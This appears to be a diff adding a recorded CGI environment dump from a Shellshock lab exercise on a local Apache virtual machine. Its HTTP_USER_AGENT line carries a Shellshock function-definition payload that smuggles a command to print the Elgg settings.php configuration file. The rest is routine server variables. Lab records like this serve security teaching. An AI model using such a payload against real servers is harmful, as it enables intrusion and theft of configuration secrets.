@@ -1,0 +1,24 @@
+******Environment Variables******
+HTTP_HOST=10.0.2.15
+HTTP_USER_AGENT=() {echo normal; }; echo 'Content-type: text/plain'; echo; /bin/cat /var/www/CSRF/Elgg/elgg-config/settings.php
+HTTP_ACCEPT=*/*
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+SERVER_SIGNATURE=<address>Apache/2.4.18 (Ubuntu) Server at 10.0.2.15 Port 80</address>
+SERVER_SOFTWARE=Apache/2.4.18 (Ubuntu)
+SERVER_NAME=10.0.2.15
+SERVER_ADDR=10.0.2.15
+SERVER_PORT=80
+REMOTE_ADDR=10.0.2.15
+DOCUMENT_ROOT=/var/www/html
+REQUEST_SCHEME=http
+CONTEXT_PREFIX=/cgi-bin/
+CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
+SERVER_ADMIN=webmaster@localhost
+SCRIPT_FILENAME=/usr/lib/cgi-bin/myprog3.cgi
+REMOTE_PORT=59110
+GATEWAY_INTERFACE=CGI/1.1
+SERVER_PROTOCOL=HTTP/1.1
+REQUEST_METHOD=GET
+QUERY_STRING=
+REQUEST_URI=/cgi-bin/myprog3.cgi
+SCRIPT_NAME=/cgi-bin/myprog3.cgi
